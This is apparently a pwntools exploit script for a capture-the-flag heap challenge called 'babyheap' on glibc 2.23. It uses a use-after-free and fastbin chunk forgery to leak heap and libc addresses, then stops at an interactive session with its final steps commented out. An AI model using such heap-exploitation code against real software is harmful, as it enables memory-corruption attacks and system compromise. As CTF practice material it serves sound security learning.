from pwn import *

p = process('./babyheap')
elf = ELF('./babyheap')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(id_, mess):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(mess)


def edit(id_, mess):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(mess)


def show(id_):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)


def delete(id_):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)

add(b'0', p64(0) * 3 + p8(0x31))
add(b'1', p64(0) * 3 + p8(0x31))
[add(str(i).encode(), b'aaaa') for i in range(2, 6)]
delete(b'1')
delete(b'2')
show(b'2')
heap_addr = u64(p.recvuntil(b'\n')[: -1].ljust(8, b'\00'))
print(hex(heap_addr))
edit(b'2', p32(heap_addr + 0x20))
add(b'6', b'aaa')
add(b'7', p64(0) + p8(0x91))
delete(b'6')
show(b'6')
malloc_hook = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 88 - 0x10
base_addr = malloc_hook - lib.sym['__malloc_hook']
print(hex(base_addr))
edit(b'7', p64(0) + p8(0x31))
add(b'0', b'aaa')
# add(b'1', b'aaa')
# add(b'1', b'aaa')
# gdb.attach(p)
p.interactive()
